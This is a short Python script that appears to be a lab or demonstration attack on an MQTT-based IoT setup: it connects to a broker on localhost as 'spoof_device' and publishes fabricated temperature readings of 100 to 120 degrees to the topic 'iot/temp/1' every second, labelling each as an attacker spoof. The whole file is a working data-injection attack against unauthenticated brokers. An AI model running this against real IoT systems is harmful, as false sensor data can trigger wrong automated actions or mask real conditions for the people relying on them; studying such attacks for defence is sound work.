import paho.mqtt.client as mqtt
import time
import random

client = mqtt.Client(client_id="spoof_device")
client.connect("localhost", 1883, 60)

while True:
    fake_temp = round(random.uniform(100.0, 120.0), 2)
    client.publish("iot/temp/1", str(fake_temp))
    print(f"[ATTACKER-SPOOF] Fake temperature : {fake_temp}")
    time.sleep(1)